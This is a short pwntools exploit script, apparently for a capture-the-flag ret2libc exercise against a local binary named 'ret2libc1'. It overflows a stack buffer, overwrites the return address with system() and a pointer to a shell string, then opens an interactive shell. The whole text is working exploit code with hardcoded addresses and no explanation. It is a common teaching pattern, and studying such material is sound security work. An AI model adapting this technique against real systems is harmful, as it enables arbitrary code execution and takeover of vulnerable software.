from pwn import *
bash=0x08048720
str=0xff874fec
ebp=0xff875058 
system=0x08048460 
payload=b'A'*(ebp-str+4)+p32(system)+b'b'*4+p32(bash)
shell=process("./ret2libc1")
shell.sendline(payload)
shell.interactive()